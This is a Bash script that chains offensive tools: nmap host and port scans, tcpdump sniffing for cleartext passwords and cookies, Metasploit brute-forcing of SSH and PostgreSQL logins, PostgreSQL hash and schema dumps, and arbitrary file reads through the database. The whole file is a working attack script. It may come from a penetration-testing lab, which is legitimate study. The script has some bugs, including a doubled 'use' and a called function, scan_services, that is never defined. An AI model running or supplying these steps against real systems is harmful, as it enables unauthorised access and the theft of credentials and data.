#!/bin/bash

scan_network(){
    echo "Scanning host on specific network"
    sudo nmap -sn $1
}
scan_ports() {
    echo "Scanning ports on target host"
    nmap -p- "$1"
}

scan_versions() {
    echo "Scanning version services on target port"
    sudo nmap -sV "$1"
}

scan_ssh_auth_methods() {
    echo "Type username: "
    read  username
    echo "Scanning ssh to check auth-methods"
    nmap -p22 "$1" --script ssh-auth-methods --script-args="ssh.user=$username"
}

capture_password_traffic() {
    sudo tcpdump -s 0 -A -n -l host "$1" and port "$2" | egrep -i "password"
}

capture_cookies_traffic() {
    sudo tcpdump -nn -A -s0 -l host "$1" and port "$2" | egrep -i 'Set-Cookie|Host:|Cookie:'
}

brute_force_ssh() {
    msfconsole -x "use scanner/ssh/ssh_login; set VERBOSE true; run ssh://$1 threads=50 user_file=./ssh_usernames.txt pass_file=./ssh_passwords.txt; exit -y"
}

brute_force_postgres() {
    msfconsole -x "use use auxiliary/scanner/postgres/postgres_login; set VERBOSE true; run postgres://$1 threads=50 user_file=./db_usernames.txt pass_file=./db_passwords.txt; exit"
}

dump_hash_user_postgres() {
    echo -n "Type obtained database password: "
    read pg_password
    msfconsole -x "use auxiliary/scanner/postgres/postgres_hashdump; run postgres://postgres:$pg_password@$1/shop; exit"
}

dump_schema_postgres() {
    echo -n "Type obtained database password: "
    read pg_password
    msfconsole -x "use auxiliary/scanner/postgres/postgres_schemadump; run postgres://postgres:$pg_password@$1 ignored_databases=template1,template0,postgres; exit"
}

postgres_readfile() {
    echo -n "Type obtained database password: "
    read pg_password
    echo -n "Type the path to the file you want to read: "
    read path_file
    msfconsole -x "use auxiliary/admin/postgres/postgres_readfile; set RHOSTS $1; set PASSWORD $pg_password; set RFILE $path_file; run; exit"
}


# Obsługa argumentów i wywołanie odpowiednich funkcji
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <target_ip> <function>"
    echo "Functions available: scan_ports, scan_services, scan_ssh_auth_methods, capture_password_traffic, capture_cookies_traffic, brute_force_ssh dump_hash_user_postgres
    dump_schema_postgres postgres_readfile"
    exit 1
fi

function_name="$1"
target_ip="$2"
target_port="$3"

case "$function_name" in
    "scan_network")
        scan_network "$target_ip" 
        ;;
    "scan_ports")
        scan_ports "$target_ip"
        ;;
    "scan_services")
        scan_services "$target_ip"
        ;;
    "scan_ssh_auth_methods")
        scan_ssh_auth_methods "$target_ip"
        ;;
    "capture_password_traffic")
        capture_password_traffic "$target_ip" "$target_port"
        ;;
    "capture_cookies_traffic")
        capture_cookies_traffic "$target_ip" "$target_port"
        ;;
    "brute_force_ssh")
        brute_force_ssh "$target_ip"
        ;;
    "brute_force_postgres")
        brute_force_postgres "$target_ip"
        ;;
    "dump_hash_user_postgres")
        dump_hash_user_postgres "$target_ip"
        ;;
    "dump_schema_postgres")
        dump_schema_postgres "$target_ip"
        ;;
    "postgres_readfile")
        postgres_readfile "$target_ip"
        ;;
    *)
        echo "Invalid function name. Available functions: scan_network, scan_ports, scan_services, scan_ssh_auth_methods, capture_password_traffic, brute_force_ssh, brute_force_postgres
        dump_hash_user_postgres, dump_schema_postgres, postgres_readfile"
        exit 1
        ;;
esac